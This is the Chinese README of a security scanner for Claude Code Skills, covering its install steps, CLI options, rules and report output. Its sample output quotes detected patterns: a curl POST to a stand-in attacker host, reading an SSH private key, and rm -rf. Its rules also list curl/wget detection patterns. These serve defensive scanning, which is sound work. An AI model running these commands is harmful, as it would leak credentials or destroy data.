# Skill-Security-Scanner

> 🔍 Claude Skills 安全扫描工具 - 保护你的开发环境

[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-1.0.0-orange.svg)](https://github.com/huifer/skill-security-scan)

**[English Documentation](README_EN.md)** | **中文文档**

## 📖 简介

**skill-security-scan** 是一个命令行工具，用于扫描和检测 Claude Skills 的安全风险。在安装第三方 Skills 前，使用此工具进行安全审查，有效防止恶意代码窃取数据或破坏系统。

本项目由 [WellAlly Technology](https://www.wellally.tech/) 开发者发起并维护，致力于为开发者社区提供安全可靠的工具。

### ⚠️ 为什么需要 skill-security-scan？

在本地 Claude Code 中使用 Skills 存在以下安全风险：

1. **完整文件系统访问** - Skills 可以读取任意文件，包括 SSH 密钥、API 密钥等
2. **网络访问能力** - Skills 可以向外部服务器发送数据
3. **脚本执行权限** - Skills 可以执行任意系统命令
4. **依赖破坏** - Skills 可能修改全局依赖，破坏其他项目

## ✨ 特性

- 🔍 **全面安全检测** - 网络、文件、命令、代码注入等多维度检测
- 🎯 **智能风险评分** - 自动计算风险分数和等级
- 🎨 **多种输出格式** - HTML 报告（默认）、彩色终端、JSON 报告
- 🌍 **国际化支持** - 支持中文和英文界面
- 📁 **智能路径扫描** - 自动扫描 `.claude/skills/` 目录和当前目录
- ⚙️ **灵活配置** - 自定义规则、白名单管理
- 🚀 **高性能** - 快速扫描大型项目

## 🚀 快速开始

### 安装

```bash
# 克隆仓库
git clone https://github.com/huifer/skill-security-scan
cd skill-security-scan

# 安装包（可编辑模式）
pip install -e .

# 或使用 pip 直接安装
pip install skill-security-scan
```

### 基本使用

```bash
# 扫描当前目录和 .claude/skills/（默认行为）
skill-security-scan scan

# 扫描指定路径（仍会自动包含 .claude/skills/）
skill-security-scan scan /path/to/skill

# 扫描并生成指定名称的 HTML 报告
skill-security-scan scan --output my_report.html

# 生成 JSON 报告
skill-security-scan scan --format json --output report.json

# 仅控制台输出（不生成 HTML 文件）
skill-security-scan scan --format console

# 使用自定义规则
skill-security-scan scan --rules custom-rules.yaml

# 只显示严重问题
skill-security-scan scan --severity CRITICAL

# 使用英文界面
skill-security-scan scan --lang en_US
```

## 📋 命令选项

```bash
skill-security-scan scan [OPTIONS] [PATHS]...

Options:
  -r, --recursive         递归扫描子目录
  -o, --output FILE       输出报告文件（HTML 默认自动生成文件名）
  -f, --format FORMAT     报告格式 [console|json|html]（默认: html）
  --rules FILE            自定义规则文件
  --severity LEVEL        最低显示级别 [CRITICAL|WARNING|INFO]（默认: INFO）
  --no-color              禁用彩色输出
  --fail-on LEVEL         遇到指定级别错误时退出码非0
  --lang LANG             界面语言 [zh_CN|en_US]（默认: zh_CN）

Arguments:
  PATHS                   要扫描的路径（可选，默认扫描当前目录和 .claude/skills/）
```

**说明**:
- 未指定路径时，默认扫描当前目录（`.`）和 `.claude/skills/` 目录
- 指定路径时，仍会自动扫描 `.claude/skills/` 目录（如果存在）
- HTML 格式为默认输出，会自动生成带时间戳的文件名（如 `skill_scan_report_20231229_113252.html`）
- 控制台始终会显示扫描摘要，无论使用何种报告格式

## 🎯 检测规则

### 🔴 CRITICAL (严重)
- **NET001**: 外部网络请求到非官方域名
- **FILE001**: 访问敏感文件（SSH 密钥、.env 等）
- **FILE002**: 危险文件操作（rm -rf /, chmod 777）
- **CMD001**: 执行危险系统命令（sudo, dd）
- **INJ001**: 代码注入模式
- **INJ003**: 后门植入

### 🟡 WARNING (警告)
- **CMD002**: 系统命令调用（os.system, subprocess）
- **INJ002**: 动态代码执行（eval, exec）
- **DEP001**: 全局包安装
- **DEP002**: 强制版本覆盖

### 🔵 INFO (提示)
- 代码混淆模式
- 隐藏命令

## 📊 输出示例

### HTML 报告（默认）

默认生成美观的 HTML 报告，包含：
- 📊 可视化风险仪表板
- 🔍 可按严重级别筛选的问题列表
- 📈 交互式图表和统计
- 📱 响应式设计，支持移动端查看
- 🌍 中英文界面自动切换

HTML 报告会在浏览器中打开，方便详细审查和分析。

### 控制台输出

```
[*] 扫描 Skills:
  - /path/to/skill
  - .claude\skills

[!] Risk Level: CRITICAL (10.0/10)

[!] CRITICAL 问题 (67 个):
  [NET001] in SKILL.md:15
    Pattern: curl -X POST https://attacker-server.com/collect
    Confidence: 高

  [FILE001] in scripts/setup.sh:8
    Pattern: cat ~/.ssh/id_rsa
    Confidence: 高

  [CMD001] in SKILL.md:23
    Pattern: rm -rf /tmp/*
    Confidence: 中

[*] WARNING 问题 (61 个):
  [CMD002] in SKILL.md:46
    Pattern: os.system("unknown command")
    Confidence: 中
  还有 57 个

[*] 摘要:
  Total Files Scanned: 7
  Critical Issues: 67
  Warning Issues: 61
  Info Issues: 0
  Total Issues: 128

[*] 建议: 请勿使用 - 检测到严重安全风险

Report saved to: skill_scan_report_20231229_113252.html
```

## ⚙️ 配置

### 规则配置

编辑 `config/rules.yaml` 来自定义检测规则：

```yaml
network_rules:
  - id: NET001
    name: "外部网络请求"
    severity: CRITICAL
    patterns:
      - "curl\\s+.*http"
      - "wget\\s+"
    description: "检测到向外发送数据的网络请求"
    allowed_domains:
      - "api.anthropic.com"
      - "github.com"
```

### 白名单管理

```bash
# 添加规则到白名单
skill-security-scan whitelist add NET001

# 查看白名单
skill-security-scan whitelist list

# 从白名单移除
skill-security-scan whitelist remove NET001
```

## 🧪 测试

```bash
# 运行测试
pytest tests/

# 运行测试并覆盖
pytest tests/ --cov=src --cov-report=html
```

## 📦 打包成可执行文件

项目可以使用 PyInstaller 打包成独立的可执行文件，无需安装 Python 环境即可运行。

### 打包步骤

1. **安装 PyInstaller**

```bash
pip install pyinstaller
```

2. **执行打包命令**

```bash
# 使用项目中的 spec 文件打包
pyinstaller skill-security-scan.spec --clean
```

3. **获取可执行文件**

打包完成后，可执行文件位于 `dist/skill-security-scan.exe`（Windows）或 `dist/skill-security-scan`（Linux/macOS）。

文件大小约 10MB，包含了所有必要的依赖和配置文件。

### 使用可执行文件

```bash
# 直接运行，无需安装 Python
./dist/skill-security-scan.exe --help

# 扫描目录
./dist/skill-security-scan.exe scan /path/to/skill

# 生成报告
./dist/skill-security-scan.exe scan --output report.html
```

### 打包文件说明

- **skill-security-scan.spec** - PyInstaller 配置文件
  - 定义了打包入口点为 `standalone_cli.py`
  - 包含了 `config/*.yaml` 配置文件
  - 包含了整个 `src/` 目录
  - 设置了 UTF-8 编码支持，解决 Windows 中文显示问题

- **standalone_cli.py** - 可执行文件入口点
  - 处理 PyInstaller 打包后的路径问题
  - 使用 `runpy.run_module()` 执行 CLI 模块
  - 自动修复 Windows 控制台编码问题

- **dist/skill-security-scan.exe** - 最终可执行文件
  - 可独立运行，无需 Python 环境
  - 支持所有 CLI 功能
  - 可直接复制到其他机器使用

### 跨平台打包

```bash
# Windows
pyinstaller skill-security-scan.spec --clean

# Linux/macOS
pyinstaller skill-security-scan.spec --clean
```

注意：可执行文件需要在目标操作系统上打包，或使用对应的虚拟环境打包。

## 📁 项目结构

```
skill-security-scan/
├── src/
│   ├── scanner/        # 扫描引擎
│   ├── rules/          # 安全规则
│   ├── reporters/      # 报告生成器（Console, JSON, HTML）
│   ├── i18n/           # 国际化文件（中文、英文）
│   ├── config_loader.py # 配置加载器
│   ├── rules_factory.py # 规则工厂
│   └── cli.py          # 命令行接口
├── config/             # 配置文件
│   ├── rules.yaml      # 安全检测规则
│   └── whitelist.yaml  # 白名单配置
├── tests/              # 测试用例
│   ├── skills/         # 测试用 Skills
│   └── test_*.py       # 单元测试
├── examples/           # 示例 Skills
└── docs/               # 文档
```

## 🔒 安全性

- ✅ 只进行静态分析，不执行 Skill 代码
- ✅ 输入路径验证，防止路径遍历
- ✅ 资源使用限制（CPU、内存）
- ✅ 规则签名验证

## 🤝 贡献

欢迎贡献！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启 Pull Request

## 📄 许可证

MIT License - 查看 [LICENSE](LICENSE) 文件了解详情

## 🙏 致谢

- 感谢所有贡献者
- 感谢 Anthropic 提供 Claude Code 平台

## 📮 联系方式

- 问题反馈: [GitHub Issues](https://github.com/huifer/skill-security-scan/issues)
- 邮箱: huifer97@163.com
- 网站: https://www.wellally.tech/

---

**⚠️ 免责声明**: 此工具不能保证 100% 检测所有安全风险。请始终谨慎使用第三方 Skills，并在隔离环境中测试。

---

## 📚 相关文档

- [技术论文 (中文)](docs/articles/ZH_SKILL_SECURITY_SCANNER_TECHNICAL_ARTICLE.md) - 系统架构与实现详解
- [Technical Paper (English)](docs/articles/EN_SKILL_SECURITY_SCANNER_TECHNICAL_ARTICLE.md) - Architecture and Implementation
- [安全分析 (中文)](docs/articles/ZH_SKILLS_SECURITY_ANALYSIS.md) - Skills 生态安全风险评估
- [Security Analysis (English)](docs/articles/EN_SKILLS_SECURITY_ANALYSIS.md) - Security Risk Assessment
- [工作流程图](docs/WORKFLOW_DIAGRAMS.md) - 业务执行逻辑详解

---

**中文文档** | **[English Documentation](README_EN.md)**
